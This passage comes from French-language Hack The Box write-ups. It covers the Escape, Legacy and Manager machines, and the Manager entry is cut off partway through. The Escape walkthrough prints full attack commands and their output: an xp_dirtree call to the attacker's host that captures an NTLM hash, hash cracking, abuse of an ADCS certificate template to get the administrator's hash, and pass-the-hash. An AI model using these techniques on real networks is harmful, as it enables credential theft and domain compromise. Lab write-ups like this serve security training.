SERVICE       VERSION\n53/tcp    open  domain        Simple DNS Plus\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-10-14 20:14:07Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)\n|_ssl-date: 2023-10-14T20:15:37+00:00; +7h59m59s from scanner time.\n| ssl-cert: Subject: commonName=dc.sequel.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.sequel.htb\n| Not valid before: 2022-11-18T21:20:35\n|_Not valid after:  2023-11-18T21:20:35\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=dc.sequel.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.sequel.htb\n| Not valid before: 2022-11-18T21:20:35\n|_Not valid after:  2023-11-18T21:20:35\n|_ssl-date: 2023-10-14T20:15:37+00:00; +8h00m00s from scanner time.\n1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM\n| ms-sql-info: \n|   10.129.81.126:1433: \n|     Version: \n|       name: Microsoft SQL Server 2019 RTM\n|       number: 15.00.2000.00\n|       Product: Microsoft SQL Server 2019\n|       Service pack level: RTM\n|       Post-SP patches applied: false\n|_    TCP port: 1433\n|_ssl-date: 2023-10-14T20:15:37+00:00; +7h59m59s from scanner time.\n| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback\n| Not valid before: 2023-10-14T20:11:04\n|_Not valid after:  2053-10-14T20:11:04\n| ms-sql-ntlm-info: \n|   10.129.81.126:1433: \n|     Target_Name: sequel\n|     NetBIOS_Domain_Name: sequel\n|     NetBIOS_Computer_Name: DC\n|     DNS_Domain_Name: sequel.htb\n|     DNS_Computer_Name: dc.sequel.htb\n|     DNS_Tree_Name: sequel.htb\n|_    Product_Version: 10.0.17763\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)\n|_ssl-date: 2023-10-14T20:15:37+00:00; +7h59m59s from scanner time.\n| ssl-cert: Subject: commonName=dc.sequel.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.sequel.htb\n| Not valid before: 2022-11-18T21:20:35\n|_Not valid after:  2023-11-18T21:20:35\n3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=dc.sequel.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.sequel.htb\n| Not valid before: 2022-11-18T21:20:35\n|_Not valid after:  2023-11-18T21:20:35\n|_ssl-date: 2023-10-14T20:15:37+00:00; +8h00m00s from scanner time.\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n9389/tcp  open  mc-nmf        .NET Message Framing\n49667/tcp open  msrpc         Microsoft Windows RPC\n49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49674/tcp open  msrpc         Microsoft Windows RPC\n49697/tcp open  msrpc         Microsoft Windows RPC\n49702/tcp open  msrpc         Microsoft Windows RPC\nService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time: \n|   date: 2023-10-14T20:14:57\n|_  start_date: N/A\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n|_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m59s\n</code></pre> <p>Nous voyons le nom du domaine, sequel.htb, ainsi que tout les services usuels d'un DC. Pas de web, pas de services particuliers permettant de se frayer un acc\u00e8s ou d'avoir des infos... Mais un MSSQL est tout de m\u00eame pr\u00e9sent, j'imagine que le foothold se fera par l\u00e0.</p> <p>On aper\u00e7oit aussi l'utilisation de certificat, \u00e0 voir si ce sera \u00e0 exploiter quelque-part, je me suis beaucoup renseign\u00e9 sur le sujet mais je ne l'ai jamais r\u00e9ellement fait, \u00e7a peut \u00eatre int\u00e9ressant !</p> <p>Je commence par tenter un enum4linux classique, mais je n'obtiens pas de r\u00e9sultats particulier. Je passe donc sur smbclient pour voir si des partages sont accessibles :</p> <pre><code>pak@kali:~$ smbclient -L \\\\sequel.htb\nPassword for [WORKGROUP\\pak]:\n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        ADMIN$          Disk      Remote Admin\n        C$              Disk      Default share\n        IPC$            IPC       Remote IPC\n        NETLOGON        Disk      Logon server share \n        Public          Disk      \n        SYSVOL          Disk      Logon server share\n</code></pre> <p>On voit un dossier \"Public\", donc je tente ma chance, mais sans trop y croire:</p> <pre><code>pak@kali:~$ smbclient //sequel.htb/Public\nPassword for [WORKGROUP\\pak]:\nTry \"help\" to get a list of possible commands.\nsmb: \\&gt; ls\n  .                                   D        0  Sat Nov 19 12:51:25 2022\n  ..                                  D        0  Sat Nov 19 12:51:25 2022\n  SQL Server Procedures.pdf           A    49551  Fri Nov 18 14:39:43 2022\n\n                5184255 blocks of size 4096. 1444011 blocks available\nsmb: \\&gt;\n</code></pre> <p>On le r\u00e9cup\u00e8re :</p> <pre><code>smb: \\&gt; get \"SQL Server Procedures.pdf\"\ngetting file \\SQL Server Procedures.pdf of size 49551 as SQL Server Procedures.pdf (254.7 KiloBytes/sec) (average 254.7 KiloBytes/sec)\n</code></pre> <p></p> <p>Ok ! Je me pr\u00e9pare une petite wordlist d'utilisateur avec les noms pr\u00e9sents dans le document, \u00e7a peut servir. On voit aussi des creds pour l'acc\u00e8s au mssql, ils ne doivent pas avoir \u00e9norm\u00e9ment de droits mais bon, on a quelque-chose :).</p>"},{"location":"Writeup/HTB/Machines/Escape/#exploitation","title":"Exploitation","text":"<p>On tente de se connecter \u00e0 mssql:</p> <pre><code>pak@kali:~$ impacket-mssqlclient PublicUser@sequel.htb\nImpacket v0.11.0 - Copyright 2023 Fortra\n\nPassword:\n[*] Encryption required, switching to TLS\n[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master\n[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english\n[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192\n[*] INFO(DC\\SQLMOCK): Line 1: Changed database context to 'master'.\n[*] INFO(DC\\SQLMOCK): Line 1: Changed language setting to us_english.\n[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) \n[!] Press help for extra shell commands\nSQL (PublicUser  guest@master)&gt;\n</code></pre> <p>On est connect\u00e9s o/ ! Mais on n'a acc\u00e8s \u00e0 pas grand chose. Un MsSQL vide, rien que du tr\u00e8s classique. </p> <pre><code>SQL (PublicUser  guest@master)&gt; enum_db\nname     is_trustworthy_on   \n------   -----------------   \nmaster                   0   \n\ntempdb                   0   \n\nmodel                    0   \n\nmsdb                     1 \n\n\n\nSQL (PublicUser  guest@master)&gt; enum_users\nUserName             RoleName   LoginName   DefDBName   DefSchemaName       UserID     SID   \n------------------   --------   ---------   ---------   -------------   ----------   -----   \ndbo                  db_owner   sa          master      dbo             b'1         '   b'01'   \n\nguest                public     NULL        NULL        guest           b'2         '   b'00'   \n\nINFORMATION_SCHEMA   public     NULL        NULL        NULL            b'3         '    NULL   \n\nsys                  public     NULL        NULL        NULL            b'4         '    NULL \n\n\n\nSQL (PublicUser  guest@master)&gt; enum_impersonate\nexecute as   database   permission_name   state_desc   grantee   grantor   \n----------   --------   ---------------   ----------   -------   -------  \n\n\nSQL (PublicUser  guest@msdb)&gt; enable_xp_cmdshell\n[-] ERROR(DC\\SQLMOCK): Line 105: User does not have permission to perform this action.\n[-] ERROR(DC\\SQLMOCK): Line 1: You do not have permission to run the RECONFIGURE statement.\n[-] ERROR(DC\\SQLMOCK): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.\n[-] ERROR(DC\\SQLMOCK): Line 1: You do not have permission to run the RECONFIGURE statement.\n</code></pre> <p>Par contre, xp_dirtree donctionne, on va donc lancer l'ami responder :).</p> <pre><code>SQL (PublicUser  guest@msdb)&gt; xp_dirtree \\\\10.10.16.35\\truc\nsubdirectory   depth   file   \n------------   -----   ----   \n</code></pre> <p>La r\u00e9ponse ne se fait pas attendre :</p> <pre><code>SMB] NTLMv2-SSP Client   : 10.129.81.126\n[SMB] NTLMv2-SSP Username : sequel\\sql_svc\n[SMB] NTLMv2-SSP Hash     : sql_svc::sequel:a6a02dbbac9d28d3:ECBB0B14CAA499F1C21BE0F8105B7C71:010100000000000080EC7F76AEFED9011938B2AEE6D4806800000000020008003500510052004A0001001E00570049004E002D004200580055004C00330034004400470036005A00330004003400570049004E002D004200580055004C00330034004400470036005A0033002E003500510052004A002E004C004F00430041004C00030014003500510052004A002E004C004F00430041004C00050014003500510052004A002E004C004F00430041004C000700080080EC7F76AEFED90106000400020000000800300030000000000000000000000000300000A401AD8EFEE268390CFF1D1727512D9D2310CAB5E65EEEDB97C2684ACBF859020A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00330035000000000000000000\n</code></pre> <p>Okay, on a maintenant un user sql_svc et son hash ! Ne reste plus qu'\u00e0 prier pour qu'on puisse le cracker sans trop de probl\u00e8me :).</p> <pre><code>pak@kali:~$ hashcat 'sql_svc::sequel:a6a02dbbac9d28d3:ECBB0B14CAA499F1C21BE0F8105B7C71:010100000000000080EC7F76AEFED9011938B2AEE6D4806800000000020008003500510052004A0001001E00570049004E002D004200580055004C00330034004400470036005A00330004003400570049004E002D004200580055004C00330034004400470036005A0033002E003500510052004A002E004C004F00430041004C00030014003500510052004A002E004C004F00430041004C00050014003500510052004A002E004C004F00430041004C000700080080EC7F76AEFED90106000400020000000800300030000000000000000000000000300000A401AD8EFEE268390CFF1D1727512D9D2310CAB5E65EEEDB97C2684ACBF859020A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00330035000000000000000000' /usr/share/wordlists/rockyou.txt.gz\n</code></pre> <pre><code>SQL_SVC::sequel:a6a02dbbac9d28d3:ecbb0b14caa499f1c21be0f8105b7c71:010100000000000080ec7f76aefed9011938b2aee6d4806800000000020008003500510052004a0001001e00570049004e002d004200580055004c00330034004400470036005a00330004003400570049004e002d004200580055004c00330034004400470036005a0033002e003500510052004a002e004c004f00430041004c00030014003500510052004a002e004c004f00430041004c00050014003500510052004a002e004c004f00430041004c000700080080ec7f76aefed90106000400020000000800300030000000000000000000000000300000a401ad8efee268390cff1d1727512d9d2310cab5e65eeedb97c2684acbf859020a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e00330035000000000000000000:REGGIE1234ronnie\n</code></pre> <p>Et voil\u00e0 de nouveaux creds ! sql_svc:REGGIE1234ronnie, impeccable. On a vu pendant le nmap qu'il \u00e9tait possible de se connecter via winrm. Aller, \u00e7a se tente.</p> <pre><code>pak@kali:~$ evil-winrm -i sequel.htb -u \"sql_svc\" -p \"REGGIE1234ronnie\"\n\nEvil-WinRM shell v3.5\n\nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                       \n\nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                         \n\nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\sql_svc\\Documents&gt; whoami /all\n\nUSER INFORMATION                                                                                                                           \n----------------                                                                                                                            \nUser Name      SID                                                                                                                        \n============== ==============================================                                                                              \nsequel\\sql_svc S-1-5-21-4078382237-1492182817-2568127209-1106                           \n\nGROUP INFORMATION                                                            \n-----------------                                                                       \nGroup Name                                  Type             SID          Attributes                                                       \n=========================================== ================ ============ ==================================================               \nEveryone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group               \nBUILTIN\\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group               \nBUILTIN\\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Certificate Service DCOM Access     Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group\nMandatory Label\\Medium Plus Mandatory Level Label            S-1-16-8448\n\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                    State\n============================= ============================== =======\nSeMachineAccountPrivilege     Add workstations to domain     Enabled\nSeChangeNotifyPrivilege       Bypass traverse checking       Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set Enabled\n\n\nUSER CLAIMS INFORMATION\n-----------------------\n\nUser claims unknown.\n\nKerberos support for Dynamic Access Control on this device has been disabled.\n</code></pre> <p>Et \u00e0 partir de l\u00e0, j'ai un peu gal\u00e9r\u00e9 \u00e0 avancer... Notre utilisateur ne semble pas avoir de droits particulier \u00e0 premi\u00e8re vue, winpeas ne m'a pas sp\u00e9cialement aid\u00e9 autrement qu'en confirmant l'utilisation de certificat (mais rien de trouvable avec cet utilisateur). J'ai tent\u00e9 d'\u00e9num\u00e9rer des users kerberoastables mais rien de concluant non plus. </p> <p>Bon, je tourne un peu dans le syst\u00e8me \"\u00e0 la mano\", \u00e0 la recherche de trucs int\u00e9ressants... Jusqu'\u00e0 tomber sur ce fichier:</p> <pre><code>*Evil-WinRM* PS C:\\SQLServer\\Logs&gt; type ERRORLOG.BAK\n</code></pre> <p>On y trouve notamment cette ligne :  <pre><code>2022-11-18 13:43:07.44 Logon       Error: 18456, Severity: 14, State: 8.\n2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]\n2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.\n2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]\n</code></pre></p> <p>On imagine donc que le password de 'sequel.htb\\Ryan.Cooper' puisse \u00eatre 'NuclearMosquito3'.</p> <pre><code>pak@kali:~$ crackmapexec winrm sequel.htb -u Ryan.Cooper -p 'NuclearMosquito3'\nSMB         dc.sequel.htb   5985   DC               [*] Windows 10.0 Build 17763 (name:DC) (domain:sequel.htb)\nHTTP        dc.sequel.htb   5985   DC               [*] http://dc.sequel.htb:5985/wsman\nWINRM       dc.sequel.htb   5985   DC               [+] sequel.htb\\Ryan.Cooper:NuclearMosquito3 (Pwn3d!)\n</code></pre> <p>Let's go ! On se connecte, et on a enfin le flag utilisateur :). Je retente un peu d'\u00e9num\u00e9ration au cas o\u00f9, mais je ne trouve rien de particulier. C'est l\u00e0 que je me souviens de l'utilisation des certificats ! Tentons !</p> <pre><code>*Evil-WinRM* PS C:\\Users\\Ryan.Cooper\\Documents&gt; .\\Certify.exe find /vulnerable\n\n   _____          _   _  __\n  / ____|        | | (_)/ _|\n | |     ___ _ __| |_ _| |_ _   _\n | |    / _ \\ '__| __| |  _| | | |\n | |___|  __/ |  | |_| | | | |_| |\n  \\_____\\___|_|   \\__|_|_|  \\__, |\n                             __/ |\n                            |___./\n  v1.0.0\n\n[*] Action: Find certificate templates\n[*] Using the search base 'CN=Configuration,DC=sequel,DC=htb'\n\n[*] Listing info about the Enterprise CA 'sequel-DC-CA'\n\n    Enterprise CA Name            : sequel-DC-CA\n    DNS Hostname                  : dc.sequel.htb\n    FullName                      : dc.sequel.htb\\sequel-DC-CA\n    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED\n    Cert SubjectName              : CN=sequel-DC-CA, DC=sequel, DC=htb\n    Cert Thumbprint               : A263EA89CAFE503BB33513E359747FD262F91A56\n    Cert Serial                   : 1EF2FA9A7E6EADAD4F5382F4CE283101\n    Cert Start Date               : 11/18/2022 12:58:46 PM\n    Cert End Date                 : 11/18/2121 1:08:46 PM\n    Cert Chain                    : CN=sequel-DC-CA,DC=sequel,DC=htb\n    UserSpecifiedSAN              : Disabled\n    CA Permissions                :\n      Owner: BUILTIN\\Administrators        S-1-5-32-544\n\n      Access Rights                                     Principal\n\n      Allow  Enroll                                     NT AUTHORITY\\Authenticated UsersS-1-5-11\n      Allow  ManageCA, ManageCertificates               BUILTIN\\Administrators        S-1-5-32-544\n      Allow  ManageCA, ManageCertificates               sequel\\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512\n      Allow  ManageCA, ManageCertificates               sequel\\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519\n    Enrollment Agent Restrictions : None\n\n[!] Vulnerable Certificates Templates :\n\n    CA Name                               : dc.sequel.htb\\sequel-DC-CA\n    Template Name                         : UserAuthentication\n    Schema Version                        : 2\n    Validity Period                       : 10 years\n    Renewal Period                        : 6 weeks\n    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT\n    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS\n    Authorized Signatures Required        : 0\n    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email\n    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email\n    Permissions\n      Enrollment Permissions\n        Enrollment Rights           : sequel\\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512\n                                      sequel\\Domain Users           S-1-5-21-4078382237-1492182817-2568127209-513\n                                      sequel\\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519\n      Object Control Permissions\n        Owner                       : sequel\\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500\n        WriteOwner Principals       : sequel\\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500\n                                      sequel\\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512\n                                      sequel\\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519\n        WriteDacl Principals        : sequel\\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500\n                                      sequel\\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512\n                                      sequel\\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519\n        WriteProperty Principals    : sequel\\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500\n                                      sequel\\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512\n                                      sequel\\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519\n\n\n\nCertify completed in 00:00:09.2906146\n</code></pre> <p>Donc, on a effectivement un certificat qui est vuln\u00e9rable : on devrait pouvoir request ce certificat sous le nom de l'administrateur et pouvoir faire quelque-chose :).</p> <p>Et en fait \u00e7a ne marche pas. Pourquoi ? Parce-qu'il faut que la date et l'heure soient synchronis\u00e9s au DC ! Une gal\u00e8re de comprendre le probl\u00e8me.</p> <pre><code>pak@kali:~$ sudo ntpdate -u dc.sequel.htb\n2023-10-14 23:48:42.383269 (+0200) +28799.624267 +/- 0.006328 dc.sequel.htb 10.129.81.126 s1 no-leap\nCLOCK: time stepped by 28799.624267\n</code></pre> <pre><code>pak@kali:~$ certipy-ad req -u ryan.cooper@sequel.htb -p NuclearMosquito3 -upn administrator@sequel.htb -target sequel.htb -ca sequel-dc-ca -template UserAuthentication\nCertipy v4.7.0 - by Oliver Lyak (ly4k)\n\n[*] Requesting certificate via RPC\n[*] Successfully requested certificate\n[*] Request ID is 12\n[*] Got certificate with UPN 'administrator@sequel.htb'\n[*] Certificate has no object SID\n[*] Saved certificate and private key to 'administrator.pfx'\n</code></pre> <pre><code>pak@kali:~$ certipy-ad auth -pfx administrator.pfx\nCertipy v4.7.0 - by Oliver Lyak (ly4k)\n\n[*] Using principal: administrator@sequel.htb\n[*] Trying to get TGT...\n[*] Got TGT\n[*] Saved credential cache to 'administrator.ccache'\n[*] Trying to retrieve NT hash for 'administrator'\n[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee\n</code></pre> <p>On a le hash admin, plus qu'\u00e0 aller r\u00e9cup\u00e9rer le flag :) !</p> <pre><code>pak@kali:~$ crackmapexec smb sequel.htb -u administrator -H 'a52f78e4c751e5f5e17e1e9f3e58f4ee' -X 'type C:\\Users\\administrator\\Desktop\\root.txt'\nSMB         dc.sequel.htb   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)\nSMB         dc.sequel.htb   445    DC               [+] sequel.htb\\administrator:a52f78e4c751e5f5e17e1e9f3e58f4ee (Pwn3d!)\nSMB         dc.sequel.htb   445    DC               [+] Executed command \nSMB         dc.sequel.htb   445    DC               d53dd2e96d89f754ef6011361c07d015\n</code></pre>"},{"location":"Writeup/HTB/Machines/Legacy/","title":"Legacy","text":"Room Legacy Url https://app.hackthebox.com/machines/Legacy Sujets Network / Vulnerability assesment Active/Retired lors de la r\u00e9solution Retired Difficult\u00e9 Easy"},{"location":"Writeup/HTB/Machines/Legacy/#nmap","title":"Nmap","text":"<pre><code>PORT    STATE SERVICE     REASON  VERSION\n135/tcp open  msrpc       syn-ack Microsoft Windows RPC\n139/tcp open  netbios-ssn syn-ack Microsoft Windows netbios-ssn\n445/tcp open  \ufffdm`U       syn-ack Windows XP microsoft-ds\nService Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp\n\nHost script results:\n| p2p-conficker: \n|   Checking for Conficker.C or higher...\n|   Check 1 (port 40600/tcp): CLEAN (Couldn't connect)\n|   Check 2 (port 53966/tcp): CLEAN (Couldn't connect)\n|   Check 3 (port 50902/udp): CLEAN (Failed to receive data)\n|   Check 4 (port 47445/udp): CLEAN (Failed to receive data)\n|_  0/4 checks are positive: Host is CLEAN or ports are blocked\n| nbstat: NetBIOS name: LEGACY, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:50:56:b9:7d:d3 (VMware)\n| Names:\n|   LEGACY&lt;00&gt;           Flags: &lt;unique&gt;&lt;active&gt;\n|   HTB&lt;00&gt;              Flags: &lt;group&gt;&lt;active&gt;\n|   LEGACY&lt;20&gt;           Flags: &lt;unique&gt;&lt;active&gt;\n|   HTB&lt;1e&gt;              Flags: &lt;group&gt;&lt;active&gt;\n|   HTB&lt;1d&gt;              Flags: &lt;unique&gt;&lt;active&gt;\n|   \\x01\\x02__MSBROWSE__\\x02&lt;01&gt;  Flags: &lt;group&gt;&lt;active&gt;\n| Statistics:\n|   00:50:56:b9:7d:d3:00:00:00:00:00:00:00:00:00:00:00\n|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00\n| smb-security-mode: \n|   account_used: &lt;blank&gt;\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n|_smb2-time: Protocol negotiation failed (SMB2)\n|_smb2-security-mode: Couldn't establish a SMBv2 connection.\n| smb-os-discovery: \n|   OS: Windows XP (Windows 2000 LAN Manager)\n|   OS CPE: cpe:/o:microsoft:windows_xp::-\n|   Computer name: legacy\n|   NetBIOS computer name: LEGACY\\x00\n|   Workgroup: HTB\\x00\n|_  System time: 2023-09-08T22:42:35+03:00\n|_clock-skew: mean: 5d00h27m39s, deviation: 2h07m17s, median: 4d22h57m38s\n</code></pre> <p>Du windows XP, du service SMB... Est-ce qu'on va vraiment aller chercher tr\u00e8s loin ? Je ne pense pas :). Confirmons la pr\u00e9sence de la CVE rapidement, pour le beau geste:</p> <pre><code>nmap -A --script=\"*vuln*\" -vv 10.10.10.4\n\nPORT    STATE SERVICE      REASON  VERSION\n135/tcp open  msrpc        syn-ack Microsoft Windows RPC\n139/tcp open  netbios-ssn  syn-ack Microsoft Windows netbios-ssn\n445/tcp open  microsoft-ds syn-ack Microsoft Windows XP microsoft-ds\nService Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp\n\nHost script results:\n| smb-vuln-ms17-010: \n|   VULNERABLE:\n|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)\n|     State: VULNERABLE\n|     IDs:  CVE:CVE-2017-0143\n|     Risk factor: HIGH\n|       A critical remote code execution vulnerability exists in Microsoft SMBv1\n|        servers (ms17-010).\n|           \n|     Disclosure date: 2017-03-14\n|     References:\n|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx\n|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/\n|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143\n|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED\n|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)\n|_smb-vuln-ms10-054: false\n| smb-vuln-ms08-067: \n|   VULNERABLE:\n|   Microsoft Windows system vulnerable to remote code execution (MS08-067)\n|     State: VULNERABLE\n|     IDs:  CVE:CVE-2008-4250\n|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,\n|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary\n|           code via a crafted RPC request that triggers the overflow during path canonicalization.\n|           \n|     Disclosure date: 2008-10-23\n|     References:\n|       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx\n|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250\n</code></pre> <p>Tiens donc... Il ne reste plus qu'\u00e0 lancer metasploit (on ne va pas se prendre la t\u00eate), avec le module qui va bien: ms08_067_netapi, pour la CVE CVE-2008-4250.</p> <p>On entre les options ad\u00e9quates (qui se limitent au RHOST/LHOST...), run, hop on est root.</p>"},{"location":"Writeup/HTB/Machines/Manager/","title":"Manager","text":"Room Manager Url https://app.hackthebox.com/machines/Manager Sujets Windows/AD/ADCS Active/Retired lors de la r\u00e9solution Active Difficult\u00e9 Medium"},{"location":"Writeup/HTB/Machines/Manager/#nmap","title":"Nmap:","text":"<pre><code>53/tcp    open  domain        syn-ack Simple DNS Plus\n80/tcp    open  http          syn-ack Microsoft IIS httpd 10.0\n| http-methods:\n|   Supported Methods: OPTIONS TRACE GET HEAD POST\n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n|_http-title: Manager\n88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2024-02-22 07:53:13Z)\n135/tcp   open  msrpc         syn-ack Microsoft Windows RPC\n139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn\n389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=dc01.manager.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.manager.htb\n| Issuer: commonName=manager-DC01-CA/domainComponent=manager\n| Public Key type: rsa\n| Public Key bits: 2048\n| Signature Algorithm: sha256WithRSAEncryption\n| Not valid before: 2023-07-30T13:51:28\n| Not valid after:  2024-07-29T13:51:28\n| MD5:   8f4d:67bc:2117:e4d5:43e9:76bd:1212:b562\n| SHA-1: 6779:9506:0167:b030:ce92:6a31:f81c:0800:1c0e:29fb\n| -----BEGIN CERTIFICATE-----\n| MIIGMDCCBRigAwIBAgITXwAAAAnyIQ82Fp4XhwAAAAAACTANBgkqhkiG9w0BAQsF\n##SNIP##\n| 5U81h/XKD4e21fDdv4wge+LFubtqzOqOKWXlrOXcfdc7dBdRt+tD3bIcTO63AQFC\n| A0xH1Q==\n|_-----END CERTIFICATE-----\n|_ssl-date: 2024-02-22T07:54:42+00:00; +7h00m06s from scanner time.\n445/tcp   open  microsoft-ds? syn-ack\n464/tcp   open  kpasswd5?     syn-ack\n593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)\n|_ssl-date: 2024-02-22T07:54:43+00:00; +7h00m06s from scanner time.\n| ssl-cert: Subject: commonName=dc01.manager.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.manager.htb\n| Issuer: commonName=manager-DC01-CA/domainComponent=manager\n| Public Key type: rsa\n| Public Key bits: 2048\n| Signature Algorithm: sha256WithRSAEncryption\n| Not valid before: 2023-07-30T13:51:28\n| Not valid after:  2024-07-29T13:51:28\n| MD5:   8f4d:67bc:2117:e4d5:43e9:76bd:1212:b562\n| SHA-1: 6779:9506:0167:b030:ce92:6a31:f81c:0800:1c0e:29fb\n| -----BEGIN CERTIFICATE-----\n| MIIGMDCCBRigAwIBAgITXwAAAAnyIQ82Fp4XhwAAAAAACTANBgkqhkiG9w0BAQsF\n##SNIP##\n| 